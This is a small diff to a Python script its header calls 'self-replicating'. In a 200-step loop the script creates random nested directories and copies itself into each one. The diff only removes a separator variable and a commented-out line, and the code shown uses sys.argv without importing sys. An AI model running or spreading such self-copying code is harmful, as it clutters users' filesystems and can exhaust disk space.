@@ -9,7 +9,6 @@ self-replicating python file - Replicada by archisha69
 
 import os, shutil, time, random, string
 
-sep = "\\" if os.name == "nt" else "/"
 cwd = os.getcwd()
 
 count = 0
@@ -17,7 +16,6 @@ count = 0
 while count < 200:
     name = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2, 32)))
     time.sleep(1) #cooldown, lower the value to make the process faster, higher the value to make the process slower (prevent lags)
-    #os.mkdir(f"{cwd}{sep}{name}{count}")
     os.mkdir(name)
     os.chdir(name)
     shutil.copy(f"../{sys.argv[0]}", os.getcwd())
